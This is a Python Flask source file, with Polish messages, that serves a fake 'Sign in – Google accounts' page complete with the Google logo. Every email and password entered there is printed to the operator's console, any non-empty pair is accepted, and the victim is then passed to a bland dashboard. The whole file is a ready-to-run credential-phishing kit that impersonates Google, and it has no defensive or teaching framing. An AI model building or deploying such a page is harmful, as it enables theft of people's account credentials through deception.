from flask import Flask, request, render_template_string, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "8392JDJZOSOSOEHDBDBDNSKS929288392002029Q8ZHNXZMMZLAPS9XUDHSNMALZOZUXHSBS8W9Q029UEUXXJZKXUXHEBIEOhbKlIHbBBVGUUidjebds92029827wuehdhdbdkxizzyGGHIkdoe9e8e83829220w0020q17626373849940"

login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in – Google accounts</title>
    <style>
        body { font-family: Roboto, sans-serif; background: #f5f5f5; }
        .container { width: 100%; max-width: 400px; margin: auto; padding-top: 100px; }
        .logo { display: block; margin: 0 auto 20px; width: 100px; }
        h1 { font-size: 24px; margin-bottom: 20px; text-align: center; }
        input, button { width: 100%; padding: 10px; margin-bottom: 10px; }
        button { background-color: #4285F4; color: white; border: none; }
        button:hover { background-color: #357ae8; }
        .footer { margin-top: 20px; font-size: 12px; color: #666; text-align: center; }
        .error { color: red; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
        <h1>Sign In</h1>
        {% if error %}
        <p class="error">{{ error }}</p>
        {% endif %}
        <form method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">By signing in, you agree to our terms.</div>
    </div>
</body>
</html>
"""

dashboard_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <style>
        body { font-family: Roboto, sans-serif; background: #e0f7fa; }
        .container { width: 100%; max-width: 600px; margin: auto; padding-top: 100px; text-align: center; }
        h1 { font-size: 28px; margin-bottom: 20px; }
        p { font-size: 18px; }
        a { display: inline-block; margin-top: 20px; color: #4285F4; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Witaj, {{ email }}!</h1>
        <p>To jest twój panel użytkownika.</p>
        <a href="{{ url_for('logout') }}">Wyloguj się</a>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def sign_in():
    error = None
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]

        print(f"\n[+] Email: {email}")
        print(f"[+] Hasło: {password}\n")

        if email and password:
            session['email'] = email
            return redirect(url_for('dashboard'))
        else:
            error = "Błąd: podaj email i hasło."

    return render_template_string(login_page, error=error)

@app.route("/dashboard")
def dashboard():
    if 'email' in session:
        return render_template_string(dashboard_page, email=session['email'])
    else:
        return redirect(url_for('sign_in'))

@app.route("/logout")
def logout():
    session.pop('email', None)
    return redirect(url_for('sign_in'))

if __name__ == "__main__":
    print("[*] Serwer na http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
